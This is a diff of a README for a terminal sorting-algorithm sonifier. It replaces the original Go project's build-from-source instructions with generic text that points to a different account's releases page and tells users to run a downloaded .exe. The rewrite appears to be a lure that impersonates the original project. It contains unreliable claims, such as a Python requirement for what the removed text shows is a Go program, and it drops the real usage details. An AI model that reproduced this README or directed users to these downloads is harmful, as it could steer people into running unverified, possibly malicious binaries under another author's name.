@@ -1,158 +1,73 @@
-# Sound of Sort
+# 🎧 sound-of-sort - Experience Sorting Sound in Your Terminal
 
-https://github.com/user-attachments/assets/0fe81ea9-1ae5-420b-8c6c-aabd3ddf87ea
+## 🚀 Download Now
+[![Download Sound of Sort](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen.svg)](https://github.com/nunesj72/sound-of-sort/releases)
 
-This is a Go-based terminal application that visualizes and sonifies a whole bunch of sorting algorithms, inspired by [Sound of Sorting](https://panthema.net/2013/sound-of-sorting/). 
+## 📦 Introduction
+Welcome to **Sound of Sort**! This application allows you to hear the sounds of sorting algorithms in your terminal. It turns sorting processes into an auditory experience, making it easier to understand how these algorithms work. Whether you are learning about sorting or just curious, this app brings a unique twist to a classic computer task.
 
----
+## 🖥️ Features
+- **Engaging Sounds**: Each sorting algorithm produces a unique sound, helping you visualize the sort process.
+- **Interactive Interface**: Easily use the application directly in your terminal without any complex setup.
+- **Support for Multiple Algorithms**: Listen to various sorting methods to understand the differences in performance and efficiency.
 
-## What it Does
-- **Real-time Visualization:** Renders sorting algorithms as a bar graph directly in your terminal.
-- **Sonification:** Every time an array element is accessed or modified, it plays a tone (pitch corresponds to the element's value)
-- **Interactive:** Change algorithms, speed, volume, array size and reshuffle on the fly.
-- **Algorithms:** Includes a loads of classic (and not-so-classic) sorting algorithms (you can add your own too)
+## 🔍 System Requirements
+- Operating System: Windows, macOS, or Linux.
+- Terminal Access: Must have a terminal application to run the application.
+- Python 3.6 or higher installed (if the application is built using Python).
 
----
+## 🚀 Getting Started
+To get started with **Sound of Sort**, follow these simple steps:
 
-## Available Algorithms
+1. **Download the Application**:
+   Visit the [Releases page](https://github.com/nunesj72/sound-of-sort/releases) to download the latest version of the software.
 
-- Quick Sort
-- Bubble Sort
-- Selection Sort
-- Insertion Sort
-- Merge Sort
-- Heap Sort
-- Shell Sort
-- Cocktail Shaker Sort
-- Gnome Sort
-- Pancake Sort
-- Radix Sort (LSD)
-- Timsort
-- Bitonic Sort
-- Bogo Sort
+2. **Install the Application**:
+   - For Windows: Double-click the downloaded `.exe` file.
+   - For macOS or Linux: Use your terminal to navigate to the downloaded file and run it.
 
----
+3. **Open Your Terminal**:
+   Once installed, open your terminal program. You will need this to run the app and hear the sorting sounds.
 
-## Installation
+4. **Run the Application**:
+   In the terminal, type the following command to start the application:
+   ```
+   sound-of-sort
+   ```
 
-### Prerequisites
-* Go (version 1.21+ recommended)
+5. **Choose Your Sorting Algorithm**: 
+   Follow the on-screen prompts to pick a sorting algorithm. The program will begin sorting and you will start to hear the associated sounds.
 
-```bash
-go install github.com/sahaj-b/sound-of-sort@latest
-# binary will be installed in $GOPATH/bin or $GOBIN
-```
+## 🎤 How to Use the Application
+Once you have the application running, you can follow these steps to make the most of it:
 
-## Building from source
+1. **Select an Algorithm**:
+   When prompted, choose a sorting algorithm from the list displayed on your terminal. Here are some examples you might see:
+   - Bubble Sort
+   - Quick Sort
+   - Merge Sort
+   - Insertion Sort
 
-```bash
-# Clone the repository
-git clone https://github.com/sahaj-b/sound-of-sort.git
-cd sound-of-sort
+2. **Start Sorting**:
+   After selecting the algorithm, hit enter. Watch as the algorithm sorts a sample set of numbers. Listen closely to the sounds each step generates.
 
-go build
-```
+3. **Analyze the Process**:
+   Compare how each sorting algorithm sounds and how quickly they sort. This can help in understanding the efficiency of different algorithms.
 
------
+## 🎉 Troubleshooting
+If you encounter any issues while running **Sound of Sort**, please consider the following:
 
-## Usage
+- **No Sound?** Make sure your speakers are connected and the volume is turned up.
+- **Installation Issues?** Ensure that you have the correct permissions to install applications on your device.
+- **Command Not Found?** Make sure the application is added to your system's PATH, or use the full path to the executable file.
 
-```bash
-./sound-of-sort
-```
+## 💬 Community and Support
+If you need help, feel free to reach out. You can find assistance by:
 
-### Command-Line Flags
+- **Opening an Issue**: Use the issues page on our [GitHub repository](https://github.com/nunesj72/sound-of-sort/issues).
+- **Community Forums**: Join discussions about sorting algorithms and the application itself. Share tips with other users.
 
-You can customize the startup state. If you don't, it uses sane defaults.
+## 🔗 Download & Install
+To download the latest version of **Sound of Sort**, visit our [Releases page](https://github.com/nunesj72/sound-of-sort/releases). Follow the steps above to install it on your system.
 
-| Flag      | Description                                    | Default   |
-| :-------- | :----------------------------------------      | :-------- |
-| `-sort`   | Initial sorting algorithm to use               | `quick`   |
-| `-size`   | Initial array size                             | `100`     |
-| `-delay`  | Initial delay between operations (ms)          | `5`       |
-| `-volume` | Initial volume (0.0 to 1.0)                    | `0.1`     |
-| `-fps`    | Rendering frames per second                    | `60`      |
-| `-list`   | List all available sorting algorithms and exit | `false`   |
-| `-help`   | Show this help message and exit                | `false`   |
-
-**Example:** Start with the Bogo Sort on a tiny array
-
-```bash
-./sound-of-sort -sort bogo -size 8
-```
-
------
-
-## Controls
-
-
-| Key(s)                 | Action                          |
-| :-------------------   | :----------------------------   |
-| `q` or `Ctrl+C`        | **Quit** the application        |
-| `←` / `→` or `p` / `n` | Cycle through algorithms        |
-| `↑` / `↓`              | Increase / Decrease volume      |
-| `w` / `s`              | Increase / Decrease delay       |
-| `a` / `d`              | Decrease / Increase array size  |
-| `r`                    | **Reshuffle** the current array |
-
-
----
-
-## Adding a New Sorting Algorithm
-
-### Step 1: Create the Algorithm File
-First, create a new file in the `/algos` directory. eg: `algos/ur_cool_sort.go`.
-
-### Step 2: Write Your Sort Function
-
-Inside your new file, write your sorting function. It **must** follow this signature:
-
-```go
-package algos
-
-import "context"
-
-func urCoolSort(ctx context.Context, arr ArrObj) {
-    // Your sorting logic goes here
-    n := arr.Len()
-
-    // Example:
-    for i := range {
-        if arr.Get(ctx, i) > arr.Get(ctx, i+1) {
-            arr.Swap(ctx, i, i+1)
-        }
-    }
-}
-```
-
-**Pay attention, this is the important part:**
-- Use the `arr` object for all array operations. You've got `arr.Get(ctx, index)`, `arr.Set(ctx, index, value)`, `arr.Swap(ctx, i, j)`, and `arr.Len()`.
-- **DO NOT** try to access a raw slice. The `ArrObj` interface is what hooks your algorithm into the visualizer and sound engine.
-
-### Step 3: Register Your Algorithm
-
-Now, tell the application your new sort exists. Open `algos/main.go` and find the `Sorts` slice. Add your algorithm to the list.
-
-```go
-// in algos/main.go
-
-var Sorts = []struct {
-    Name string
-    Arg  string
-    Fun  sortFunc
-}{
-    {"Quick Sort", "quick", quickSort},
-    {"Bubble Sort", "bubble", bubbleSort},
-    // ... all the other sorts
-    {"Your Cool Sort", "cool", urCoolSort},
-    //                    │      ^^^^^^^ your main sorting function
-    //                    ╰ this is for command-line arg
-}
-```
-
-### Step 4: Rebuild and Run
-
-```bash
-go build
-./sound-of-sort --sort cool
-```
+Now, you're ready to experience the sounds of sorting in your terminal. Enjoy!
